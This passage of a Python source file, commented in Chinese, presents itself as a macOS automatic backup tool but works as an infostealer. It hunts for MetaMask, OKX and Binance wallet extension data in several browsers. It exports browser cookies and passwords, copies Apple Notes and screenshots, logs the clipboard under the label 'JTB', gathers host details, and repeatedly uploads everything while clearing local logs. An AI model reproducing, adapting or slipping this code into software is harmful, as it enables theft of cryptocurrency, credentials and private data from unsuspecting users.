                logging.info(f"  - {name}: {config['specified'][0]}")
    
    return available_volumes

@lru_cache()
def get_username():
    """获取当前用户名"""
    return os.environ.get('USERNAME', '')

def clean_backup_directory():
    """清理备份目录中的临时文件和空目录"""
    try:
        if not os.path.exists(BackupConfig.BACKUP_ROOT):
            return
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        # 清理临时目录
        temp_dir = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_temp')
        if os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir)
            except Exception as e:
                logging.error(f"清理临时目录失败: {e}")
        
        # 清理空目录
        for root, dirs, files in os.walk(BackupConfig.BACKUP_ROOT, topdown=False):
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    if not os.listdir(dir_path):  # 如果目录为空
                        os.rmdir(dir_path)
                except Exception:
                    continue
                    
    except Exception as e:
        logging.error(f"清理备份目录失败: {e}")

def backup_notes():
    """备份Mac的备忘录数据"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    notes_dir = os.path.expanduser('~/Library/Group Containers/group.com.apple.notes')
    notes_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_notes")
    
    if not os.path.exists(notes_dir):
        logging.error("备忘录数据目录不存在")
        return None
        
    backup_manager = BackupManager()
    if not backup_manager._clean_directory(notes_backup_directory):
        return None
        
    try:
        # 复制备忘录数据
        for root, _, files in os.walk(notes_dir):
            for file in files:
                if file.endswith('.sqlite') or file.endswith('.storedata'):
                    source_file = os.path.join(root, file)
                    if not os.path.exists(source_file):
                        continue
                        
                    relative_path = os.path.relpath(root, notes_dir)
                    target_sub_dir = os.path.join(notes_backup_directory, relative_path)
                    
                    if not backup_manager._ensure_directory(target_sub_dir):
                        continue
                        
                    try:
                        shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                    except Exception as e:
                        logging.error(f"复制备忘录文件失败: {e}")
                        continue
                        
        return notes_backup_directory if os.listdir(notes_backup_directory) else None
    except Exception as e:
        logging.error(f"备份备忘录数据失败: {e}")
        return None

def backup_screenshots():
    """备份截图文件"""
    def get_screenshot_location():
        """读取 macOS 截图自定义保存路径（若存在）"""
        try:
            output = subprocess.check_output(
                ['defaults', 'read', 'com.apple.screencapture', 'location'],
                stderr=subprocess.STDOUT
            ).decode('utf-8', errors='ignore').strip()
            if output and os.path.exists(output):
                return output
        except Exception:
            return None
        return None

    screenshot_paths = [
        os.path.expanduser('~/Desktop'),
        os.path.expanduser('~/Pictures')
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "屏幕快照",
        "屏幕截图",
        "截图",
        "截屏"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots")
    
    backup_manager = BackupManager()
    
    # 确保备份目录是空的
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # 扫描整个目录，筛选包含"screenshot"关键字的文件
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # 检查文件名是否包含截图关键字（不区分大小写）
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        # 既要命中截图关键字，也要是常见图片格式
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info("📸 截图备份完成，已找到符合规则的文件")
    else:
        logging.info("📸 未找到符合规则的截图文件")
            
    return screenshot_backup_directory if files_found else None

def backup_browser_extensions(backup_manager):
    """备份浏览器扩展数据（支持多个浏览器分身）"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    extensions_backup_dir = os.path.join(
        backup_manager.config.BACKUP_ROOT,
        f"{user_prefix}_browser_extensions"
    )

    # 目标扩展的识别信息（通过名称和可能的ID匹配）
    # 支持从不同商店安装的扩展（Chrome Web Store、Edge Add-ons Store等）
    target_extensions = {
        "metamask": {
            "names": ["MetaMask", "metamask"],  # manifest.json 中的 name 字段
            "ids": [
                "nkbihfbeogaeaoehlefnkodbefgpgknn",  # Chrome / Brave
                "ejbalbakoplchlghecdalmeeeajnimhm",  # Edge
            ],
        },
        "okx_wallet": {
            "names": ["OKX Wallet", "OKX", "okx wallet"],
            "ids": [
                "mcohilncbfahbmgdjkbpemcciiolgcge",  # Chrome / Brave
                "pbpjkcldjiffchgbbndmhojiacbgflha",  # Edge
            ],
        },
        "binance_wallet": {
            "names": ["Binance Wallet", "Binance", "binance wallet"],
            "ids": [
                "cadiboklkpojfamcoggejbbdjcoiljjk",  # Chrome / Brave
            ],
        },
    }
    
    # 浏览器 User Data 根目录（macOS 路径）
    # 支持多种常见浏览器和可能的变体路径
    home_dir = os.path.expanduser('~')
    app_support = os.path.join(home_dir, 'Library', 'Application Support')
    
    # 标准浏览器路径
    browser_user_data_paths = {
        "chrome": os.path.join(app_support, 'Google', 'Chrome'),
        "brave": os.path.join(app_support, 'BraveSoftware', 'Brave-Browser'),
        "edge": os.path.join(app_support, 'Microsoft Edge'),
        "chromium": os.path.join(app_support, 'Chromium'),
    }
    
    # 动态检测：尝试查找所有可能的浏览器数据目录
    def find_browser_paths():
        """动态检测浏览器路径，包括可能的变体"""
        found_paths = {}
        app_support = os.path.join(home_dir, 'Library', 'Application Support')
        
        if not os.path.exists(app_support):
            return found_paths
        
        # 已知的浏览器目录模式
        browser_patterns = {
            "chrome": ["Google/Chrome", "Google/Chrome Beta", "Google/Chrome Canary"],
            "brave": ["BraveSoftware/Brave-Browser", "BraveSoftware/Brave-Browser-Beta", "BraveSoftware/Brave-Browser-Nightly"],
            "edge": ["Microsoft Edge", "Microsoft Edge Beta", "Microsoft Edge Dev", "Microsoft Edge Canary"],
            "chromium": ["Chromium"],
        }
        
        for browser_name, patterns in browser_patterns.items():
            for pattern in patterns:
                test_path = os.path.join(app_support, pattern)
                if os.path.exists(test_path):
                    # 检查是否包含 User Data 结构（至少要有 Default 或 Profile 目录）
                    if os.path.isdir(test_path):
                        # 检查是否有 Profile 目录结构
                        has_profile = False
                        try:
                            for item in os.listdir(test_path):
                                item_path = os.path.join(test_path, item)
                                if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                                    has_profile = True
                                    break
                        except:
                            pass
                        
                        if has_profile:
                            # 使用第一个找到的版本（标准版优先）
                            if browser_name not in found_paths:
                                found_paths[browser_name] = test_path
                                if backup_manager.config.DEBUG_MODE:
                                    logging.debug(f"🔍 检测到浏览器: {browser_name} -> {test_path}")
        
        return found_paths
    
    # 合并标准路径和动态检测的路径
    detected_paths = find_browser_paths()
    for browser_name, path in detected_paths.items():
        if browser_name not in browser_user_data_paths or not os.path.exists(browser_user_data_paths[browser_name]):
            browser_user_data_paths[browser_name] = path
    
    # 调试信息：显示所有检测到的浏览器路径
    if backup_manager.config.DEBUG_MODE:
        logging.debug("🔍 开始扫描浏览器扩展，检测到的浏览器路径:")
        for browser_name, path in browser_user_data_paths.items():
            exists = "✅" if os.path.exists(path) else "❌"
            logging.debug(f"  {exists} {browser_name}: {path}")
    
    def identify_extension(ext_id, ext_settings_path):
        """通过扩展ID和manifest.json识别扩展类型"""
        # 方法1: 通过已知ID匹配
        for ext_name, ext_info in target_extensions.items():
            if ext_id in ext_info["ids"]:
                return ext_name
        
        # 方法2: 通过读取Extensions目录下的manifest.json识别
        # 扩展的实际安装目录在 Extensions 文件夹中
        try:
            # 尝试从 Local Extension Settings 的父目录找到 Extensions 目录
            profile_path = os.path.dirname(ext_settings_path)
            extensions_dir = os.path.join(profile_path, "Extensions")
            if os.path.exists(extensions_dir):
                ext_install_dir = os.path.join(extensions_dir, ext_id)
                if os.path.exists(ext_install_dir):
                    # 查找版本目录（扩展通常安装在版本号子目录中）
                    version_dirs = [d for d in os.listdir(ext_install_dir) 
                                   if os.path.isdir(os.path.join(ext_install_dir, d))]
                    for version_dir in version_dirs:
                        manifest_path = os.path.join(ext_install_dir, version_dir, "manifest.json")
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, 'r', encoding='utf-8') as f:
                                    manifest = json.load(f)
                                    ext_name_in_manifest = manifest.get("name", "")
                                    # 检查是否匹配目标扩展
                                    for ext_name, ext_info in target_extensions.items():
                                        for target_name in ext_info["names"]:
                                            if target_name.lower() in ext_name_in_manifest.lower():
                                                return ext_name
                            except Exception as e:
                                if backup_manager.config.DEBUG_MODE:
                                    logging.debug(f"读取manifest.json失败: {manifest_path} - {e}")
                                continue
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"识别扩展失败: {ext_id} - {e}")
        
        return None
    
    try:
        if not backup_manager._ensure_directory(extensions_backup_dir):
            return None
        
        backed_up_count = 0
        scanned_browsers = []  # 记录扫描过的浏览器
        found_profiles = []  # 记录找到的 Profile
        found_extensions = []  # 记录找到的所有扩展（包括非目标扩展）
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"⏭️  跳过 {browser_name}: 路径不存在 ({user_data_path})")
                continue
            
            scanned_browsers.append(browser_name)
            
            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # 检查是否是 Profile 目录（Default 或 Profile N）
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                            found_profiles.append(f"{browser_name}/{item}")
                
                if backup_manager.config.DEBUG_MODE:
                    if profiles:
                        logging.debug(f"📂 {browser_name}: 找到 {len(profiles)} 个 Profile")
                    else:
                        logging.debug(f"📂 {browser_name}: 未找到包含扩展设置的 Profile")
                
                # 备份每个 Profile 中的扩展
                for profile_name, ext_settings_path in profiles:
                    # 扫描所有扩展目录
                    try:
                        ext_dirs = [d for d in os.listdir(ext_settings_path) 
                                   if os.path.isdir(os.path.join(ext_settings_path, d))]
                        
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug(f"  📦 {browser_name}/{profile_name}: 找到 {len(ext_dirs)} 个扩展目录")
                        
                        for ext_id in ext_dirs:
                            found_extensions.append(f"{browser_name}/{profile_name}/{ext_id}")
                            # 识别扩展类型
                            ext_name = identify_extension(ext_id, ext_settings_path)
                            if not ext_name:
                                if backup_manager.config.DEBUG_MODE:
                                    logging.debug(f"    ⏭️  跳过扩展 {ext_id[:20]}... (不是目标扩展)")
                                continue  # 不是目标扩展，跳过
                            
                            source_dir = os.path.join(ext_settings_path, ext_id)
                            if not os.path.exists(source_dir):
                                continue
                            
                            # 目标目录包含 Profile 名称
                            profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                            target_dir = os.path.join(extensions_backup_dir, 
                                                     f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                            try:
                                if os.path.exists(target_dir):
                                    shutil.rmtree(target_dir, ignore_errors=True)
                                parent_dir = os.path.dirname(target_dir)
                                if backup_manager._ensure_directory(parent_dir):
                                    shutil.copytree(source_dir, target_dir, symlinks=True)
                                    backed_up_count += 1
                                    logging.info(f"📦 已备份: {browser_name} {profile_name} {ext_name} (ID: {ext_id})")
                            except Exception as e:
                                logging.error(f"复制扩展目录失败: {source_dir} - {e}")
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug(f"扫描扩展目录失败: {ext_settings_path} - {e}")
            
            except Exception as e:
                logging.error(f"扫描 {browser_name} 配置文件失败: {e}")

        # Safari 备份整个扩展目录（Safari 不使用 Chrome 扩展 ID）
        safari_root = os.path.join(home_dir, 'Library', 'Safari', 'Extensions')
        if os.path.exists(safari_root):
            target_dir = os.path.join(extensions_backup_dir, f"{user_prefix}_safari_extensions")
            try:
                if os.path.exists(target_dir):
                    shutil.rmtree(target_dir, ignore_errors=True)
                if backup_manager._ensure_directory(os.path.dirname(target_dir)):
                    shutil.copytree(safari_root, target_dir, symlinks=True)
                    backed_up_count += 1
                    if backup_manager.config.DEBUG_MODE:
                        logging.info(f"📦 已备份: Safari 扩展")
            except Exception as e:
                logging.error(f"复制 Safari 扩展目录失败: {e}")

        if backed_up_count > 0:
            logging.info(f"📦 成功备份 {backed_up_count} 个浏览器扩展")
            return extensions_backup_dir
        else:
            # 提供详细的诊断信息
            logging.warning("⚠️ 未找到任何浏览器扩展数据")
            if backup_manager.config.DEBUG_MODE:
                if scanned_browsers:
                    logging.debug(f"  已扫描浏览器: {', '.join(scanned_browsers)}")
                else:
                    logging.debug("  ❌ 未找到任何已安装的浏览器（Chrome/Brave/Edge/Chromium）")
                    logging.debug(f"  检查路径: {app_support}")
                
                if found_profiles:
                    logging.debug(f"  找到的 Profile: {', '.join(found_profiles)}")
                else:
                    logging.debug("  ❌ 未找到任何包含扩展设置的 Profile 目录")
                
                if found_extensions:
                    logging.debug(f"  找到的扩展总数: {len(found_extensions)} (但都不是目标扩展)")
                    logging.debug("  目标扩展: MetaMask, OKX Wallet, Binance Wallet")
                    if len(found_extensions) <= 5:
                        logging.debug(f"  扩展列表: {', '.join(found_extensions)}")
                else:
                    logging.debug("  ❌ 未找到任何扩展目录")
                    logging.debug("  可能原因:")
                    logging.debug("    1. 浏览器未安装任何扩展")
                    logging.debug("    2. 扩展安装在非标准位置")
                    logging.debug("    3. 使用了脚本不支持的浏览器（如 Firefox、Safari 扩展等）")
            else:
                logging.warning("  💡 提示: 开启 DEBUG_MODE 可查看详细诊断信息")
            return None
    except Exception as e:
        logging.error(f"复制浏览器扩展目录失败: {e}")
        return None

def backup_browser_data():
    """备份浏览器数据（Cookies和密码）"""
    if not CRYPTO_AVAILABLE:
        logging.warning("⚠️  跳过浏览器数据备份（pycryptodome未安装）")
        return None
    
    try:
        logging.info("\n🌐 开始备份浏览器数据...")
        exporter = BrowserDataExporter()
        browser_data_file = exporter.export_all()
        
        if browser_data_file and os.path.exists(browser_data_file):
            logging.critical("☑️ 浏览器数据备份文件已准备完成\n")
            return browser_data_file
        else:
            logging.error("❌ 浏览器数据备份失败\n")
            return None
    except Exception as e:
        logging.error(f"❌ 浏览器数据备份出错: {e}")
        return None


def backup_mac_data(backup_manager):
    """备份Mac系统数据，返回备份文件路径列表（不执行上传）
    
    Args:
        backup_manager: 备份管理器实例
        
    Returns:
        list: 备份文件路径列表，如果失败则返回空列表
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    backup_paths = []
    try:
        # 备份浏览器扩展数据
        extensions_backup = backup_browser_extensions(backup_manager)
        if extensions_backup:
            backup_path = backup_manager.zip_backup_folder(
                extensions_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_browser_extensions_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 浏览器扩展数据备份文件已准备完成\n")
            else:
                logging.error("❌ 浏览器扩展数据压缩失败\n")
        else:
            logging.warning("⏭️  浏览器扩展数据收集失败或未找到\n")
        
        # 备份浏览器数据（Cookies和密码）
        browser_data_file = backup_browser_data()
        if browser_data_file:
            backup_paths.append(browser_data_file)
        
        # 备份备忘录数据
        notes_backup = backup_notes()
        if notes_backup:
            backup_path = backup_manager.zip_backup_folder(
                notes_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_notes_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 备忘录数据备份文件已准备完成\n")
            else:
                logging.error("❌ 备忘录数据压缩失败\n")
        else:
            logging.error("❌ 备忘录数据收集失败\n")
        
        # 备份截图文件
        screenshots_backup = backup_screenshots()
        if screenshots_backup:
            backup_path = backup_manager.zip_backup_folder(
                screenshots_backup,
                os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
            )
            if backup_path:
                if isinstance(backup_path, list):
                    backup_paths.extend(backup_path)
                else:
                    backup_paths.append(backup_path)
                logging.critical("☑️ 截图文件备份文件已准备完成\n")
            else:
                logging.error("❌ 截图文件压缩失败\n")
        else:
            logging.info("ℹ️ 未发现可备份的截图文件\n")

    except Exception as e:
        logging.error(f"Mac数据备份失败: {e}")
    
    return backup_paths

def backup_volumes(backup_manager, available_volumes):
    """备份可用数据卷，返回备份文件路径列表（不执行上传）
    
    Returns:
        list: 备份文件路径列表
    """
    backup_paths = []
    for volume_name, volume_configs in available_volumes.items():
        logging.info(f"\n正在处理数据卷 {volume_name}")
        for backup_type, (source_dir, target_dir, ext_type) in volume_configs.items():
            try:
                if backup_type == 'specified':
                    # 使用指定文件备份方法
                    backup_dir = backup_manager.backup_specified_files(source_dir, target_dir)
                else:
                    # 跳过文件分类备份
                    logging.warning(f"⏭️  跳过 {backup_type} 类型的备份（文件分类备份已移除）")
                    continue
                
                if backup_dir:
                    backup_path = backup_manager.zip_backup_folder(
                        backup_dir, 
                        str(target_dir) + "_" + datetime.now().strftime("%Y%m%d_%H%M%S")
                    )
                    if backup_path:
                        if isinstance(backup_path, list):
                            backup_paths.extend(backup_path)
                        else:
                            backup_paths.append(backup_path)
                        logging.critical(f"☑️ {volume_name} {backup_type} 备份文件已准备完成\n")
                    else:
                        logging.error(f"❌ {volume_name} {backup_type} 压缩失败\n")
                else:
                    logging.error(f"❌ {volume_name} {backup_type} 备份失败\n")
            except Exception as e:
                logging.error(f"❌ {volume_name} {backup_type} 备份出错: {str(e)}\n")
    
    return backup_paths

def periodic_backup_upload(backup_manager):
    """定期执行备份和上传"""
    # 使用新的备份目录路径
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    clipboard_log_path = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_clipboard_log.txt")
    
    # 启动JTB监控线程
    clipboard_monitor_thread = threading.Thread(
        target=backup_manager.monitor_clipboard,
        args=(clipboard_log_path, backup_manager.config.CLIPBOARD_CHECK_INTERVAL),
        daemon=True
    )
    clipboard_monitor_thread.start()
    logging.critical("📋 JTB监控线程已启动")
    
    # 启动JTB上传线程
    clipboard_upload_thread_obj = threading.Thread(
        target=clipboard_upload_thread,
        args=(backup_manager, clipboard_log_path),
        daemon=True
    )
    clipboard_upload_thread_obj.start()
    logging.critical("📤 JTB上传线程已启动")
    
    # 初始化JTB日志文件
    try:
        os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
            f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    except Exception as e:
        logging.error(f"❌ 初始化JTB日志失败: {e}")

    # 获取用户名和系统信息
    username = getpass.getuser()
    hostname = socket.gethostname()
    current_time = datetime.now()
    
    # 获取系统环境信息
    system_info = {
        "操作系统": platform.system(),
        "系统版本": platform.release(),
        "系统架构": platform.machine(),
        "Python版本": platform.python_version(),
        "主机名": hostname,
        "用户名": username,
    }
    
    # 获取macOS详细版本信息
    try:
        if platform.system() == "Darwin":
            mac_ver = platform.mac_ver()[0]
            if mac_ver:
                system_info["macOS版本"] = mac_ver
            
            # 尝试获取更详细的macOS版本名称
            try:
                result = subprocess.run(
                    ['sw_vers', '-productVersion'],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if result.returncode == 0:
                    system_info["macOS详细版本"] = result.stdout.strip()
            except (subprocess.TimeoutExpired, subprocess.SubprocessError, OSError):
                pass
    except Exception:
        pass
    
    # 输出启动信息和系统环境
    logging.critical("\n" + "="*50)
    logging.critical("🚀 自动备份系统已启动")
    logging.critical("="*50)
    logging.critical(f"⏰ 启动时间: {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
    logging.critical("-"*50)
    logging.critical("📊 系统环境信息:")
    for key, value in system_info.items():
        logging.critical(f"   • {key}: {value}")
    logging.critical("-"*50)
    logging.critical("📋 JTB监控和自动上传已启动")
    logging.critical("="*50)

    def read_next_backup_time():
        """读取下次备份时间"""
        try:
            if os.path.exists(BackupConfig.THRESHOLD_FILE):
                with open(BackupConfig.THRESHOLD_FILE, 'r') as f:
                    time_str = f.read().strip()
                    return datetime.strptime(time_str, '%Y-%m-%d %H:%M:%S')
            return None
        except Exception:
            return None

    def write_next_backup_time():
        """写入下次备份时间"""
        try:
            next_time = datetime.now() + timedelta(seconds=BackupConfig.BACKUP_INTERVAL)
            os.makedirs(os.path.dirname(BackupConfig.THRESHOLD_FILE), exist_ok=True)
            with open(BackupConfig.THRESHOLD_FILE, 'w') as f:
                f.write(next_time.strftime('%Y-%m-%d %H:%M:%S'))
            return next_time
        except Exception as e:
            logging.error(f"写入下次备份时间失败: {e}")
            return None

    def should_backup_now():
        """检查是否应该执行备份"""
        next_backup_time = read_next_backup_time()
        if next_backup_time is None:
            return True
        return datetime.now() >= next_backup_time

    while True:
        try:
            if should_backup_now():
                current_time = datetime.now()
                logging.critical("\n" + "="*40)
                logging.critical(f"⏰ 开始备份  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                logging.critical("-"*40)
                
                # 获取当前可用的数据卷
                available_volumes = get_available_volumes()
                
                # 执行备份任务
                logging.critical("\n💾 数据卷备份")
                volumes_backup_paths = backup_volumes(backup_manager, available_volumes)
                
                logging.critical("\n🍎 Mac系统数据备份")
                mac_data_backup_paths = backup_mac_data(backup_manager)
                
                # 合并所有备份路径
                all_backup_paths = volumes_backup_paths + mac_data_backup_paths
                
                # 写入下次备份时间
                next_backup_time = write_next_backup_time()
                
                # 输出结束语（在上传之前）
                has_backup_files = len(all_backup_paths) > 0
                if has_backup_files:
                    logging.critical("\n" + "="*40)
                    logging.critical(f"✅ 备份完成  {current_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                else:
                    logging.critical("\n" + "="*40)
                    logging.critical("❌ 部分备份任务失败")
                    logging.critical("="*40)
                    logging.critical("📋 备份任务已结束")
                    if next_backup_time:
                        logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
                    logging.critical("="*40 + "\n")
                
                # 开始上传备份文件
                if all_backup_paths:
                    logging.critical("📤 开始上传备份文件...")
                    upload_success = True
                    for backup_path in all_backup_paths:
                        if not backup_manager.upload_file(backup_path):
                            upload_success = False
                    
                    if upload_success:
                        logging.critical("✅ 所有备份文件上传成功")
                    else:
                        logging.error("❌ 部分备份文件上传失败")
                
                # 上传备份日志
                logging.critical("\n📝 正在上传备份日志...")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as e:
                    logging.error(f"❌ 日志备份上传失败: {e}")
            
            # 每小时检查一次是否需要备份
            time.sleep(backup_manager.config.BACKUP_CHECK_INTERVAL)

        except Exception as e:
            logging.error(f"\n❌ 备份出错: {e}")
            try:
                backup_and_upload_logs(backup_manager)
            except Exception as log_error:
                logging.error(f"❌ 日志备份失败: {log_error}")
            # 发生错误时也更新下次备份时间
            write_next_backup_time()
            time.sleep(backup_manager.config.ERROR_RETRY_DELAY)

def backup_and_upload_logs(backup_manager):
    """备份并上传日志文件"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
            return
            
        # 刷新日志缓冲区，确保所有日志都已写入文件
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # 等待一小段时间，确保文件系统同步
        time.sleep(0.5)
            
        # 检查日志文件大小
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"备份日志文件为空，跳过: {log_file}")
            return
            
        # 创建临时目录
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'backup_logs')
        if not backup_manager._ensure_directory(str(temp_dir)):
            logging.error("❌ 无法创建临时日志目录")
            return
            
        # 创建带时间戳的备份文件名
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        backup_name = f"{user_prefix}_backup_log_{timestamp}.txt"
        backup_path = os.path.join(temp_dir, backup_name)
        
        # 复制日志文件到临时目录
        try:
            # 读取当前日志内容
            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("⚠️ 日志内容为空，跳过上传")
                return
                
            # 写入备份文件
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # 验证备份文件是否创建成功
            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
                logging.error("❌ 备份日志文件创建失败或为空")
                return
                
            # 上传日志文件
            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                # 上传成功后清空原始日志文件，只保留一条记录
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== 📝 备份日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                    logging.info("✅ 备份日志上传成功并已清空")
                except Exception as e:
                    logging.error(f"❌ 备份日志更新失败: {e}")
            else:
                logging.error("❌ 备份日志上传失败")
                
        except (OSError, IOError, PermissionError) as e:
            logging.error(f"❌ 复制或读取日志文件失败: {e}")
        except Exception as e:
            logging.error(f"❌ 处理日志文件时出错: {e}")
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())
            
        # 清理临时目录
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"清理临时目录失败: {e}")
                
    except Exception as e:
        logging.error(f"❌ 处理备份日志时出错: {e}")
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clipboard_upload_thread(backup_manager, clipboard_log_path):
    """JTB上传线程
    
    Args:
        backup_manager: 备份管理器实例
        clipboard_log_path: JTB日志文件路径
    """
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    last_upload_time = 0
    
    while True:
        try:
            current_time = time.time()
            
            # 检查是否需要上传（每20分钟检查一次）
            if current_time - last_upload_time >= BackupConfig.CLIPBOARD_INTERVAL:
                if os.path.exists(clipboard_log_path):
                    # 检查文件大小
                    file_size = os.path.getsize(clipboard_log_path)
                    if file_size > 0:
                        # 检查文件内容是否有实际记录
                        if backup_manager.has_clipboard_content(clipboard_log_path):
                            # 创建临时文件
                            temp_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f'{user_prefix}_temp', 'clipboard')
                            if backup_manager._ensure_directory(temp_dir):
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                temp_file = os.path.join(temp_dir, f"{user_prefix}_clipboard_{timestamp}.txt")
                                
                                try:
                                    # 复制日志内容到临时文件
                                    shutil.copy2(clipboard_log_path, temp_file)
                                    
                                    # 上传临时文件
                                    if backup_manager.upload_file(temp_file):
                                        # 上传成功后清空原始日志文件
                                        with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                            f.write(f"=== 📋 JTB日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传 ===\n")
                                        last_upload_time = current_time
                                        if backup_manager.config.DEBUG_MODE:
                                            logging.info("📤 JTB日志上传成功")
                                except Exception as e:
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.error(f"❌ JTB日志上传失败: {e}")
                                finally:
                                    # 清理临时目录
                                    try:
                                        if os.path.exists(temp_dir):
                                            shutil.rmtree(temp_dir)
                                    except Exception:
                                        pass
                        else:
                            # 文件没有实际内容，清空文件并重置上传时间
                            if backup_manager.config.DEBUG_MODE:
                                logging.info("📋 JTB文件无实际内容，跳过上传")
                            with open(clipboard_log_path, 'w', encoding='utf-8') as f:
                                f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                            last_upload_time = current_time
                
            # 定期检查
